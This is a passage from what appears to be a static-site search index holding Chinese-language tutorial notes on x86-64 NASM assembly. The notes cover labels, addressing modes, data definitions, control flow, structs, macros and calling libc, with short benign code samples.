<p>\u4ee5<code>.</code>\u5f00\u5934\u7684\u79f0\u4e3a\u672c\u5730\u6807\u7b7e\uff0c\u4f8b\u5982\u4e0a\u9762\u7684<code>.hello</code>\uff0c\u7f16\u8bd1\u5668\u4f1a\u628a\u5b83\u7ffb\u8bd1\u4e3a\u5176\u524d\u4e00\u4e2a\u6807\u7b7e+\u672c\u5730\u6807\u7b7e\uff0c\u5373<code>main.hello</code>\uff0c\u8fd9\u6837\u5c31\u5f62\u6210\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u540d\u5b57\u7a7a\u95f4\u7684\u6548\u679c\u3002\u8ba9\u5927\u6bb5\u7684\u903b\u8f91\u5206\u6210\u591a\u4e2a\u7247\u6bb5\uff0c\u4e0d\u9700\u8981\u62c5\u5fc3\u547d\u540d\u4e0a\u7684\u51b2\u7a81\uff0c\u5c5e\u4e8e\u6c47\u7f16\u8fd9\u95e8\u8bed\u8a00\u63d0\u4f9b\u7684\u4e00\u4e2a\u529f\u80fd\u3002\u5b83\u548c\u672c\u5730\u7b26\u53f7\u65e0\u5173\uff0c<code>main.hello</code>\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u5168\u5c40\u7684\u7b26\u53f7\uff0c\u4ee3\u8868\u7684\u4e00\u79cd\u8eab\u4efd\uff0c\u800c<code>.hello</code>\u4f9d\u7136\u662f\u4e00\u4e2a\u672c\u5730\u6807\u7b7e\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u79f0\u8c13\u3002</p>"},{"location":"sicp/asm/#_9","title":"\u5165\u53e3\u6807\u7b7e","text":"<p>GNU\u7684\u94fe\u63a5\u5668\u9ed8\u8ba4\u4f7f\u7528\u4e00\u4e2a\u7279\u6b8a\u7b26\u53f7<code>_start</code>\u5f53\u505a\u7a0b\u5e8f\u7684\u5165\u53e3\uff0c\u5982\u679c\u6211\u4eec\u6ca1\u5b9a\u4e49\u8fd9\u6837\u7684\u540d\u5b57\u6216\u8005\u628a\u5b83\u6539\u4e3a\u4e00\u4e2a\u5176\u4ed6\u540d\u5b57\uff0c\u90a3\u4e48\u94fe\u63a5\u5668\u94fe\u63a5\u7684\u65f6\u5019\u5c31\u4f1a\u7528\u4e00\u4e2a\u9ed8\u8ba4\u7684\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u53ef\u80fd\u662f\u7a0b\u5e8f<code>.text</code>\u6bb5\u7684\u7b2c\u4e00\u884c\uff0c\u540c\u65f6\u94fe\u63a5\u5668\u4f1a\u63d0\u793a:<code>ld: warning: cannot find entry symbol _start; defaulting to 00000000004000b0</code>\u3002\u94fe\u63a5\u5668\u5141\u8bb8\u4f7f\u7528<code>ld -e</code>\u81ea\u884c\u6307\u5b9a\u4e00\u4e2a\u5165\u53e3\u6807\u7b7e\uff0c\u5f53\u7136\u8fd9\u4e2a\u6807\u7b7e\u5fc5\u987b\u662f\u5168\u5c40\u7684\u3002</p>"},{"location":"sicp/asm/#_10","title":"\u6bb5\u6807\u7b7e\u4e0e\u5185\u5b58\u5730\u5740","text":"<p>\u53ef\u4ee5\u4f7f\u7528<code>$</code>\u8868\u793a\u5f53\u524d\u8fd9\u884c\u6307\u4ee4\u7684\u5185\u5b58\u5730\u5740\uff0c<code>$$</code>\u8868\u793a\u5f53\u524dsection\u7684\u8d77\u59cb\u5730\u5740\uff0c\u540c\u65f6\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u53cd\u6c47\u7f16\u89c2\u5bdf\u5230\u8df3\u8f6c\u65f6\u6807\u7b7e\u548c\u5185\u5b58\u5730\u5740\u4e00\u4e00\u5bf9\u5e94\u7684\u5173\u7cfb: <pre><code>global _start \nsection .text \n    main:\n        mov rax, main \n        mov rbx, .exit\n        mov rcx, $\n        mov rdx, $$\n    .exit:    \n        mov rax, 60\n        xor rdi, rdi\n        syscall\n    _start:\n        jmp main\n</code></pre></p> <pre><code>[ubuntu] ~/.mac/assem $ nasm -g -F dwarf -f elf64 -o hello.o hello.s\n[ubuntu] ~/.mac/assem $ ld -o hello hello.o\n[ubuntu] ~/.mac/assem $ objdump -d -M intel hello\nhello:     file format elf64-x86-64\nDisassembly of section .text:\n0000000000400080 &lt;main&gt;:\n  400080:   48 b8 80 00 40 00 00    movabs rax,0x400080\n  400087:   00 00 00\n  40008a:   48 bb a8 00 40 00 00    movabs rbx,0x4000a8\n  400091:   00 00 00\n  400094:   48 b9 94 00 40 00 00    movabs rcx,0x400094\n  40009b:   00 00 00\n  40009e:   48 ba 80 00 40 00 00    movabs rdx,0x400080\n  4000a5:   00 00 00\n00000000004000a8 &lt;main.exit&gt;:\n  4000a8:   b8 3c 00 00 00          mov    eax,0x3c\n  4000ad:   48 31 ff                xor    rdi,rdi\n  4000b0:   0f 05                   syscall\n00000000004000b2 &lt;_start&gt;:\n  4000b2:   eb cc                   jmp    400080 &lt;main&gt;\n</code></pre>"},{"location":"sicp/asm/#_11","title":"\u8bed\u8a00\u89c4\u8303","text":""},{"location":"sicp/asm/#_12","title":"\u5bfb\u5740\u65b9\u5f0f","text":"<p>\u5bfb\u5740\u65b9\u5f0f\u5c31\u662f\u901a\u8fc7\u4ec0\u4e48\u65b9\u5f0f\u786e\u5b9a\u76ee\u6807\u6240\u5728\u7684\u5730\u5740\u3002\u6211\u4eec\u628a\u5bc4\u5b58\u5668\u5f53\u6210\u4e00\u4e2a\u4e2a\u7684\u76d2\u5b50\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u5bfb\u5740\u65b9\u5f0f:</p> <ul> <li>\u7acb\u5373\u5bfb\u5740\uff0c<code>mov rax, 0x100</code>\uff0c\u76f4\u63a5\u628a\u503c0x100\u653e\u5728\u4e00\u4e2a\u76d2\u5b50\u4e2d</li> <li>\u5bc4\u5b58\u5668\u5bfb\u5740\uff0c<code>mov rax, rbx</code>\uff0c\u628a\u4e00\u4e2a\u76d2\u5b50\u4e2d\u7684\u503c\u653e\u5728\u53e6\u4e00\u4e2a\u76d2\u5b50\u4e2d</li> <li>\u76f4\u63a5\u5bfb\u5740\uff0c<code>mov rax, [5]</code>\uff0c\u628a5#\u76d2\u5b50\u4e2d\u7684\u503c\u653e\u5728\u53e6\u4e00\u4e2a\u76d2\u5b50\u4e2d\uff0c5\u4ee3\u8868\u5185\u5b58\u5730\u5740</li> <li>\u5bc4\u5b58\u5668\u95f4\u63a5\u5bfb\u5740\uff0c<code>mov rax,[rbx]</code>\uff0crbx\u4e2d\u5b58\u7740\u5185\u5b58\u5730\u5740\uff0c\u628a\u8fd9\u4e2a\u5730\u5740\u5bf9\u5e94\u7684\u503c\u653e\u5728\u76d2\u5b50\u4e2d</li> <li>\u5bc4\u5b58\u5668\u76f8\u5bf9\u5bfb\u5740\uff0c<code>mov rax,[8+rbx]</code>\uff0c\u5148\u7b97\u51farbx+8\uff0c\u5f97\u5230\u4e00\u4e2a\u5185\u5b58\u5730\u5740\u800c\u5df2</li> <li>\u57fa\u5740\u53d8\u5740\uff0c<code>lea rax, [rbx+rcx]</code>\uff0c\u628a\u5730\u5740\u62ff\u51fa\u6765\u653e\u5230\u76d2\u5b50\u91cc</li> </ul> <p><code>mov rax, 0x100</code>\u8868\u793a\u7ed9rax\u8d4b\u503c\u4e3a0x100\uff0c<code>mov rax, [0x100]</code>\u8868\u793a\u7ed9rax\u8d4b\u503c\u5185\u5b580x100\u4f4d\u7f6e\u7684\u503c\uff0c<code>lea rax, [0x100]</code>\u8868\u793a\u76f4\u63a5\u53bb\u627e[0x100]\u7684\u5730\u5740\u53730x100\uff0c\u8d4b\u503c\u7ed9rax\u3002<code>mov</code>\u662f\u5bf9\u4e8e\u5185\u5bb9\u7684\u64cd\u4f5c\uff0c<code>lea</code>\u662f\u5bf9\u4e8e\u5730\u5740\u7684\u64cd\u4f5c\u3002<code>mov</code>\u662f\u4e0d\u80fd\u76f4\u63a5\u5728\u4e24\u5757\u5185\u5b58\u4e4b\u95f4\u8fdb\u884c\u590d\u5236\u7684\u3002<code>[addr]</code>\u8fd9\u79cd\u8868\u8fbe\u65b9\u5f0f\u5c5e\u4e8eNASM\u7f16\u8bd1\u5668\u5bf9\u5185\u5b58\u64cd\u4f5c\u5fc5\u987b\u8fd9\u4e48\u505a\uff0c\u5373\u4fbf\u662f\u4e00\u4e2a\u53d8\u91cf\u540d\u79f0\uff08\u4ee3\u8868\u4e00\u4e2a\u5185\u5b58\u5730\u5740\uff09\uff0c\u4f8b\u5982<code>x=100</code>\uff0c\u4e5f\u5f97\u7528<code>[x]</code>\u624d\u53d6\u7684\u5230\u5b83\u7684\u503c100\u3002</p>"},{"location":"sicp/asm/#_13","title":"\u53d8\u91cf","text":"<p>\u53ef\u4ee5\u5728<code>.data</code>\u548c<code>.bss</code>\u6bb5\u4e2d\u5b9a\u4e49\u53d8\u91cf\uff0c\u5b9a\u4e49\u793a\u4f8b: <pre><code>section .data\n    x dq 0x8070605040302010    \n    y db 1,2,3\n    z times 3 dw 1,2                  \n    leny equ $-y                ;$\u4e3a\u5f53\u524d\u5730\u5740\uff0c\u6240\u4ee5\u51cf\u53bby\u7684\u5730\u5740\uff0c\u5c31\u662fy\u7684\u957f\u5ea6\n\n    s db \"abcd\", \"e\", \"f\"       ; db*6\n    lens equ $-s                ; equ\u5b9a\u4e49\u7684\u662f\u5e38\u91cf\uff0c\u4e0d\u4f1a\u5b58\u50a8\u5728.data\u4e2d\n\nsection .bss\n    xx resq 2 \n    yy times 2 resb 8\n</code></pre> <code>x</code>\u662f\u53d8\u91cf\u540d\u79f0\uff0c\u4ee3\u8868\u7b26\u53f7\u7684\u5730\u5740\uff0c\u53d8\u91cf\u7684\u8d77\u59cb\u5730\u5740\uff1b<code>dq</code>\u4ee3\u8868\u5b83\u7684\u957f\u5ea6\uff1b<code>0x8070605040302010</code>\u4ee3\u8868\u5b83\u7684\u521d\u59cb\u5316\u503c\u3002</p> <p>\u5b57\u7b26\u548c\u5b83\u4ee3\u8868\u7684\u957f\u5ea6\u5982\u4e0b\u8868\u6240\u793a:</p> .data\u4e2d \u957f\u5ea6(bytes) .bss\u4e2d db 1 resb dw 2 resw dd 4 resd dq 8 resq dt 10 rest do 16 reso dy 32 resy dz 64 resz <p><code>y db 1,2,3</code>\u5c31\u8868\u793a\u4ecey\u8fd9\u4e2a\u5185\u5b58\u5730\u5740\u5f00\u59cb\uff0c\u540e\u9762\u9017\u53f7\u5206\u9694\u7684\u6709\u4e09\u5757\u5185\u5b58\uff0c\u6bcf\u5757\u5185\u5b58\u90fd\u662fdb\u5927\u5c0f\u4e14\u503c\u4e3a\u5bf9\u5e94\u76841\u30012\u30013\u3002\u6c47\u7f16\u8bed\u8a00\u4e2d\u662f\u6ca1\u6709\u5b57\u7b26\u4e32\u7684\uff0c\u50cf<code>\"abcd\"</code>\u5c31\u662f\u62ff\u5b83\u7684ASCII\u503c\u628a\u5b83\u5f53\u505a\u5b57\u8282\u5e8f\u5217\u3002<code>s db \"abcd\", \"e\", \"f\"</code>\u4e2ddb\u653e\u4e0d\u4e0b\u6574\u4e2a<code>\"abcd\"</code>\uff0c\u5c31\u7528\u4e864\u4e2adb\u6765\u653e\u3002<code>equ</code>\u662f\u5b9a\u4e49\u5e38\u91cf\u7684\u65b9\u5f0f\uff0c\u89c1\u540e\u6587\u63cf\u8ff0\u3002\u53e6\u5916\uff0c\u6570\u5b57\u6709\u5927\u5c0f\u7aef\u548c\u8fdb\u5236\u7684\u95ee\u9898\u3002</p> <p>\u5728<code>.data</code>\u4e2d\u662f\u5b9a\u4e49\uff0c\u800c\u5728<code>.bss</code>\u4e2d\u662f\u9884\u7559\u3002<code>xx resq 2</code>\u5c31\u8868\u793a\u4ece<code>xx</code>\u5f00\u59cb\uff0c\u9884\u7559<code>resq</code>\u5927\u5c0f\u7684\u7a7a\u95f4\uff0c\u9884\u7559<code>2</code>\u7ec4\u3002</p> <p><code>times</code>\u7c7b\u4f3c\u4e8e\u8bed\u6cd5\u7cd6\uff0c\u7528\u4e8e\u91cd\u590d\u5b9a\u4e49\u6570\u636e\u6216\u6307\u4ee4\u3002<code>yy times 2 resb 8</code>\u5c31\u8868\u793a<code>yy resb 8</code>\u91cd\u590d\u4e24\u6b21\u3002</p>"},{"location":"sicp/asm/#_14","title":"\u5e38\u91cf","text":"<p>\u5e38\u91cf\u662f\u4e0d\u4f1a\u5b58\u5728<code>.data</code>\u6bb5\u4e2d\u7684\uff0c\u5c3d\u7ba1\u6211\u4eec\u5728\u90a3\u91cc\u5b9a\u4e49\uff0c\u4f46\u5b83\u4f1a\u88ab\u7f16\u8bd1\u5668\u5c55\u5f00\uff0c\u53d8\u4e3a\u6307\u4ee4\u7684\u4e00\u90e8\u5206\uff0c\u4fdd\u5b58\u5728<code>.text</code>\u6bb5\u4e2d\u3002</p> <p>\u6c47\u7f16\u8bed\u8a00\u4e2d\u5e38\u91cf\u6709\u56db\u79cd\uff0c\u5373\u6574\u6570\u3001\u6d6e\u70b9\u6570\u3001\u5b57\u7b26\u3001\u5b57\u7b26\u4e32\u3002\u6574\u6570\u5e38\u91cf\u7684\u503c\u6709\u4e0d\u540c\u7684\u5199\u6cd5:</p> <ul> <li>\u5341\u8fdb\u5236\u7684\uff0c100, 0100, 100d, 0100d, 0d100</li> <li>\u5341\u516d\u8fdb\u5236\u7684\uff0c0h64, 0x64, $064, 64h</li> <li>\u4e8c\u8fdb\u5236\u7684\uff0c0b101, 101b</li> </ul> <p>\u5b57\u7b26\u4ee3\u8868\u7684\u662f\u5176ASCII\u7684\u5e38\u91cf\u503c\uff0c\u652f\u6301\u8f6c\u4e49\uff0c\u652f\u6301\u5355\u53cc\u548c\u53cd\u5f15\u53f7\u3002\u5b57\u7b26\u4e32\u4f1a\u88ab\u89e3\u6790\u4e3aASCII\u7684\u5e8f\u5217\uff0c\u4ece\u5de6\u4f9d\u6b21\u6392\u5217\u3002</p> <p>\u6574\u578b\u5e38\u91cf\u901a\u8fc7<code>equ</code>\u5b9a\u4e49\uff0c\u4f8b\u5982<code>leny equ $-y</code>\uff0c\u5b83\u5e38\u7528\u6765\u548c<code>$</code>\u3001<code>$$</code>\u914d\u5408\u8ba1\u7b97\u957f\u5ea6\uff0c\u4f46\u4e0d\u652f\u6301\u7528\u5b83\u6765\u5b9a\u4e49\u6d6e\u70b9\u6570\u3002</p> <p>\u53e6\u4e00\u79cd\u5e38\u89c1\u7684\u5b9a\u4e49\u65b9\u5f0f\u662f\u4f7f\u7528<code>%assign name value</code>\uff0c\u5b83\u53ef\u4ee5\u5728\u4efb\u610f\u4f4d\u7f6e\u5b9a\u4e49\uff0c\u800c\u4e14\u53ef\u4ee5\u91cd\u590d\u5b9a\u4e49\uff0c\u4f7f\u7528\u65f6\u4ee5\u6700\u540e\u4e00\u6b21\u7684\u5b9a\u4e49\u4e3a\u51c6\u3002\u8fd9\u79cd\u5b9a\u4e49\u65b9\u5f0f\u5c5e\u4e8e\u4f7f\u7528\u5b8f\uff0c\u5b83\u662f\u7f16\u8bd1\u5668\u5728\u5bf9\u4ee3\u7801\u9884\u5904\u7406\u9636\u6bb5\u5c31\u5c55\u5f00\u7684\u3002</p>"},{"location":"sicp/asm/#_15","title":"\u6307\u4ee4","text":"<p>\u5e38\u7528\u7684\u6307\u4ee4\u5176\u5b9e\u5f88\u5c11\uff0c\u5982\u4e0b\u6240\u793a\uff0c\u5982\u679c\u9047\u5230\u5176\u4ed6\u590d\u6742\u7684\u6307\u4ee4\u4e5f\u53ea\u9700\u8981\u641c\u7d22\u4e00\u4e0b\u5373\u53ef\u3002</p> <ul> <li>\u6570\u636e\u79fb\u52a8: mov, push, pop, lea</li> <li>\u7b97\u672f: inc, dec, add, sub, imul, idev </li> <li>\u4e8c\u8fdb\u5236\u903b\u8f91\u8fd0\u7b97: not, and, xor, or</li> <li>\u4f4d\u79fb: shl, shr</li> <li>\u5b57\u8282\u6570\u7ec4\u6216\u5b57\u7b26\u4e32: rep, movsb, cmpsb, scasb, stomb</li> </ul> <p>\u6709\u65f6\u7531\u4e8e\u6307\u4ee4\u96c6\u7684\u9650\u5236\u7981\u6b62\u4e00\u4e9b\u64cd\u4f5c\uff0c\u4f8b\u5982mov\u4e0d\u80fd\u7528\u4e8e\u5185\u5b58\u5230\u5185\u5b58\u7684\u64cd\u4f5c\uff0c\u8fd9\u4e9b\u90fd\u53ef\u4ee5\u901a\u8fc7x86\u624b\u518c\u67e5\u770b\u5230\u3002</p>"},{"location":"sicp/asm/#_16","title":"\u63a7\u5236\u6d41","text":"<p>\u5728\u6c47\u7f16\u8bed\u8a00\u4e2d\uff0c\u57fa\u672c\u7684\u63a7\u5236\u6d41\u5c31\u662f\u8df3\u8f6c\u548c\u5faa\u73af\uff0c\u5176\u4ed6\u7684\u63a7\u5236\u6d41\u4e5f\u53ea\u662f\u57fa\u4e8e\u8fd9\u4e24\u79cd\u7684\u7ec4\u5408\u3002\u9ad8\u7ea7\u8bed\u8a00\u91cc\u7684\u63a7\u5236\u6d41\u4e5f\u53ea\u662f\u770b\u4e0a\u53bb\u66f4\u65b9\u4fbf\uff0c\u672c\u8d28\u4e0a\u5728CPU\u773c\u91cc\u4ecd\u7136\u662f\u8df3\u8f6c\u548c\u5faa\u73af\u3002</p>"},{"location":"sicp/asm/#_17","title":"\u8df3\u8f6c","text":"<p>\u8df3\u8f6c\u4e00\u822c\u90fd\u662f\u6307\u8df3\u8f6c\u5230\u67d0\u4e2alabel\uff0c\u5206\u4e3a\u4e09\u79cd\uff0c\u7b2c\u4e00\u79cd<code>jmp</code>\u7c7b\u4f3c\u4e8egoto\uff0c\u5c5e\u4e8e\u65e0\u6761\u4ef6\u8df3\u8f6c\u3002</p> <p>\u7b2c\u4e8c\u79cd<code>test</code>\u5219\u662f\u9488\u5bf9\u5176\u4e24\u4e2a\u53c2\u6570\u8fdb\u884c\u4e8c\u8fdb\u5236AND\u903b\u8f91\u64cd\u4f5c\uff0c\u5e76\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\u6807\u5fd7\u5bc4\u5b58\u5668\u7684ZF\u6807\u5fd7\u4f4d\u3002\u4e4b\u540e\u914d\u5408<code>jz</code>(\u548cje\u7b49\u4ef7)\u3001<code>jnz</code>(\u548cjne\u7b49\u4ef7)\u6307\u4ee4\uff0c\u5b83\u4eec\u4f1a\u5224\u65adZF\u6807\u5fd7\u4f4d\u7684\u503c\u5b8c\u6210\u8df3\u8f6c\u3002 <pre><code>    _start:\n        mov     rax, 1\n        test    rax, rax ; \u5982\u679cAX\u4e3a0\uff0c\u5219\u628aZF\u8bbe\u4e3a1\uff0c\u5426\u5219\u628aZF\u8bbe\u4e3a0\n        jne     .exit    ; \u5982\u679cZF\u4e3a0\uff0c\u5219\u8df3\u8f6c\u81f3.exit\u6807\u7b7e\n</code></pre></p> <p>\u7b2c\u4e09\u79cd\u662f\u4f7f\u7528<code>cmp</code>\u6bd4\u8f83\u4e24\u4e2a\u53c2\u6570\uff0c\u6bd4\u8f83\u7684\u7ed3\u679c\u5b58\u5230\u76f8\u5e94\u7684\u72b6\u6001\u5bc4\u5b58\u5668\u4e2d\uff0c\u6839\u636e\u72b6\u6001\u5bc4\u5b58\u5668\u7684\u503c\u518d\u914d\u5408\u76f8\u5173\u6307\u4ee4\u5b8c\u6210\u8df3\u8f6c:</p> <ul> <li>je (==), jne (!=), jz (==0), jnz (!=0) </li> <li>jg (&gt;), jge (&gt;=), jl (&lt;), jle (&lt;=)</li> </ul> <pre><code>_start:\n    mov rax, 1 \n    mov rbx, 2 \n    cmp rax, rbx \n    jne .exit\n</code></pre>"},{"location":"sicp/asm/#_18","title":"\u5faa\u73af","text":"<p>\u5faa\u73af\u9700\u8981\u5148\u5c06\u5faa\u73af\u591a\u5c11\u6b21\u653e\u5230<code>rcx</code>\u5bc4\u5b58\u5668\u4e2d\uff0c\u7136\u540e\u6267\u884c\u5faa\u73af\u4f53\u903b\u8f91\uff0c\u6700\u540e\u8c03\u7528loop\u6307\u4ee4\uff0c\u8be5\u6307\u4ee4\u5728rcx\u5bc4\u5b58\u5668\u5927\u4e8e0\u65f6\u4f1a\u51cf\u4e00\u5e76\u8df3\u8f6c\u5230\u5176\u53c2\u6570\u7684\u4f4d\u7f6e\uff0c\u7b49\u4e8e0\u65f6\u5219\u4f1a\u63a5\u7740\u5411\u4e0b\u6267\u884c\u3002 <pre><code>_start:\n    xor rax, rax\n    mov rcx, 3\n.abc:\n    inc rax\n    loop .abc\n</code></pre> \u7c7b\u4f3c\u4e8edo(sth...) until{rcx==0}\u3002</p>"},{"location":"sicp/asm/#_19","title":"\u6570\u636e\u7ed3\u6784","text":""},{"location":"sicp/asm/#_20","title":"\u5b57\u7b26\u4e32","text":"<p>\u6c47\u7f16\u4e2d\u4f1a\u628a\u5b57\u7b26\u4e32\u5f53\u505a\u5b57\u8282\u5e8f\u5217\u6765\u5904\u7406\uff0c\u5b57\u8282\u5b9e\u9645\u4e0a\u662f\u4e2a\u6574\u6570\uff0c\u5b83\u7684\u53d6\u503c\u8303\u56f4\u662f0~255\u3002\u5f53\u6211\u4eec\u901a\u8fc7: <pre><code>string db `\\u6c49\\xe5\\xad\\x97 \\u263a \\n` ; \u6c49\u5b57, \u263a -&gt; UTF-8\n</code></pre> \u5b9a\u4e49\u5b57\u7b26\u4e32\u65f6\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5b57\u8282\u5e8f\u5217\uff0c\u53ea\u662f\u62bd\u8c61\u5c42\u9762\u4e0a\u53ef\u4ee5\u7406\u89e3\u4e3a\u5b57\u7b26\u4e32\u3002\u800c\u5bf9\u4e8e\u8fd9\u79cd\u5b57\u8282\u5e8f\u5217\uff0cCPU\u4e5f\u63d0\u4f9b\u4e86\u4e13\u95e8\u7684\u6307\u4ee4\u9002\u7528\u4e8e\u66f4\u9ad8\u6548\u7684\u79fb\u52a8\u5b83\u4eec\uff0c\u5373rep movs\u3002</p> <p>\u7f16\u8bd1\u5668\u652f\u6301<code>\\u</code>\u3001<code>\\x</code>\u4ee5\u53cautf-8\u7b49\u65b9\u5f0f\u7684\u7f16\u7801\u3002\u5b57\u7b26\u4e32\u53ef\u4ee5\u653e\u5728<code>section .rodata</code>(\u53ea\u8bfb)\u6216<code>section .data</code>\u4e2d\u3002</p>"},{"location":"sicp/asm/#_21","title":"\u6570\u7ec4","text":"<p>\u6570\u7ec4\u5b9e\u9645\u4e0a\u5c31\u662f\u4e00\u4e2a\u8fde\u7eed\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u91cc\u9762\u53ea\u6709\u5143\u7d20\uff0c\u6ca1\u6709\u522b\u7684\u4e1c\u897f\u3002\u6570\u7ec4\u5b9a\u4e49\u65f6\u5f97\u544a\u8bc9\u7f16\u8bd1\u5668\u5176\u957f\u5ea6\uff0c\u7f16\u8bd1\u5668\u624d\u597d\u5b89\u6392\u5730\u5740\u3002\u6c47\u7f16\u91cc\u6ca1\u6709\u6570\u7ec4\u8fd9\u79cd\u8bed\u6cd5\uff0c\u6211\u4eec\u7684\u505a\u6cd5\u53ea\u662f\u4fdd\u7559\u4e00\u6bb5\u5185\u5b58\u7a7a\u95f4\uff0c\u672c\u8d28\u4e0a\u6211\u4eec\u5bf9\u6570\u7ec4\u7684\u64cd\u4f5c\u5c31\u662f\u5bf9\u5176\u5185\u5b58\u5730\u5740\u7684\u64cd\u4f5c\u3002 <pre><code>section .bss\n    %assign num 10\n    %assign size 8\n    array resq num * size\n</code></pre> \u901a\u8fc7<code>num*size</code>\u8ba1\u7b97\u51fa\u6570\u7ec4\u7684\u957f\u5ea6\uff0carray\u4ee3\u8868\u6570\u7ec4\u7684\u8d77\u59cb\u5730\u5740\uff0c\u8981\u62ff\u5230array[i]\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u901a\u8fc7<code>array+size*i</code>\u3002</p>"},{"location":"sicp/asm/#_22","title":"\u7ed3\u6784\u4f53","text":"<p>\u7ed3\u6784\u4f53\u5b9e\u9645\u4e0a\u4e5f\u662f\u4e00\u4e2a\u8fde\u7eed\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u53ea\u662f\u5176\u5185\u90e8\u5b57\u6bb5\u7684\u957f\u5ea6\u4e0d\u540c\uff0c\u5728\u6c47\u7f16\u4e2d\u8fd8\u662f\u6309\u7167\u8d77\u59cb\u5730\u5740\u52a0\u504f\u79fb\u91cf\u53bb\u6570\u683c\u5b50\u5b9a\u4f4d\u5230\u4e0d\u540c\u7684\u5b57\u6bb5\u3002\u90a3\u4e48\u5b83\u8fd8\u662f\u4e00\u4e2a\u7f16\u8bd1\u5668\u7684\u8bed\u6cd5\u7cd6\uff0c\u901a\u8fc7\u53cd\u6c47\u7f16\u662f\u770b\u4e0d\u5230\u7684\u3002 <pre><code>struc User\n    .name : resb 10\n    .age : resq 1\nendstruc\n\nsection .data\n    u1 istruc User\n        at User.name, db \"user1\"\n        at User.age, dq 22\n    iend\n\nsection .bss\n    u2  resb User_size\n</code></pre> \u8fd9\u6bb5\u4ee3\u7801\u5148\u5b9a\u4e49\u7684\u662f\u4e00\u4e2a\u5185\u5b58\u5e03\u5c40\uff0c\u6210\u5458\u5b57\u6bb5\u4ee3\u8868\u7684\u662f\u504f\u79fb\u91cf\u3002\u63a5\u7740\u4f7f\u7528<code>istruc</code>\u5728data\u6bb5\u4e2d\u53bb\u521d\u59cb\u5316\u4e00\u4e2a\u53d8\u91cfu1\u3002\u53c8\u4f7f\u7528u2\u5b9a\u4e49\u4e86\u4e00\u4e2a\u672a\u521d\u59cb\u5316\u503c\u7684User\uff0c<code>User_size</code>\u4e5f\u662f\u7f16\u8bd1\u5668\u8bed\u6cd5\u7cd6\uff0c\u5e2e\u52a9\u7f16\u8bd1\u5668\u7b97\u51faUser\u7ed3\u6784\u4f53\u7684\u957f\u5ea6\u3002</p>"},{"location":"sicp/asm/#_23","title":"\u5b8f","text":"<p>\u5b8f\u662f\u5728\u4ee3\u7801\u9884\u5904\u7406\u9636\u6bb5\u88ab\u5c55\u5f00\u7684\uff0c\u76f8\u5f53\u4e8e\u6a21\u677f\u3002</p>"},{"location":"sicp/asm/#define","title":"%define","text":"<p>\u5355\u884c\u5b8f\u5b9a\u4e49\uff0c\u548c<code>%assign</code>\u53ea\u652f\u6301\u5e38\u91cf\u4e0d\u540c\uff0c<code>%define</code>\u53ef\u4ee5\u652f\u6301\u53c2\u6570\u3002\u5c5e\u4e8e\u6c47\u7f16\u8bed\u8a00\u7684\u4e00\u79cd\u529f\u80fd\uff0c\u548c\u6c47\u7f16\u4e0d\u662f\u4e00\u56de\u4e8b\uff0c\u56e0\u4e3a\u6c47\u7f16\u662f\u76ee\u6807\u8bed\u8a00\u3002 <pre><code>section .text\n    %define SYS_EXIT 60\n    %define DEMO(x)         mov rax, [rbx+x]\n\n    _start:\n        DEMO(100)\n\n    .exit:\n        mov     rax, SYS_EXIT\n        xor     rdi, rdi\n        syscall\n</code></pre></p>"},{"location":"sicp/asm/#macro","title":"%macro","text":"<p>\u6709\u70b9\u50cf\u662f\u5b9a\u4e49\u51fd\u6570\uff0c\u4e2d\u95f4\u53ef\u4ee5\u5305\u542b\u591a\u884c\u4ee3\u7801\u3002 <pre><code>%macro &lt;name&gt; &lt;args_count&gt; \n...\n%endmacro\n</code></pre> \u4f7f\u7528\u8fd9\u6837\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5148\u7ed9\u5b8f\u5b9a\u4e49\u4e2a\u540d\u5b57\uff0c\u4e4b\u540e\u8ddf\u53c2\u6570\uff0c\u53c2\u6570\u53ef\u4ee5\u662f\u591a\u4e2a\u3002\u5728\u5185\u5bb9\u4e2d\u53ef\u4ee5\u4f7f\u7528<code>%1</code>\u3001<code>%2</code>\u8fd9\u6837\u7684\u65b9\u5f0f\u53bb\u8c03\u7528\u7b2cx\u4e2a\u53c2\u6570\u3002\u8fd8\u53ef\u4f7f\u7528<code>%%</code>\u8fd9\u6837\u7684\u8bed\u6cd5\u5728\u5b8f\u5185\u5b9a\u4e49\u672c\u5730\u6807\u7b7e\uff0c\u5728\u5b8f\u5c55\u5f00\u540e\u8fd9\u4e9b\u672c\u5730\u6807\u7b7e\u4f1a\u88ab\u81ea\u52a8\u91cd\u547d\u540d\u3002</p>"},{"location":"sicp/asm/#libc","title":"\u8c03\u7528libc","text":"<p>\u6c47\u7f16\u4e2d\u867d\u7136\u6ca1\u6709\u6807\u51c6\u5e93\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u6df7\u5408\u7f16\u7a0b\u8c03\u7528C\u8bed\u8a00\u7684\u6807\u51c6\u5e93\u3002</p> <p>\u8fd9\u79cd\u65b9\u5f0f\u9700\u8981\u4f7f\u7528main\u4f5c\u4e3a\u51fd\u6570\u5165\u53e3\uff0c\u5e76\u4f7f\u7528extern\u58f0\u660e\u8981\u7528\u5230\u7684libc\u51fd\u6570\uff0c\u7136\u540e\u7528\u5bc4\u5b58\u5668\u4f20\u53c2(\u4f9d\u6b21\u4e3ardi,rsi,rdx,rcx,r8,r9)\u548c\u63a5\u6536\u8fd4\u56de\u503c(rax)\uff0c\u4e14\u9700\u8981\u4f7f\u7528gcc\u4f5c\u4e3a\u94fe\u63a5\u5668\u3002</p> <pre><code>global main\nextern printf\n\nsection .data\n    s db    `hello world!\\n`\n\nsection .text\n    main:\n        push rbp\n        mov  rbp, rsp   ;\u4fdd\u5b58\u73b0\u573a\n\n        mov     rdi, s  ;\u4f20\u53c2\n        xor     rax, rax 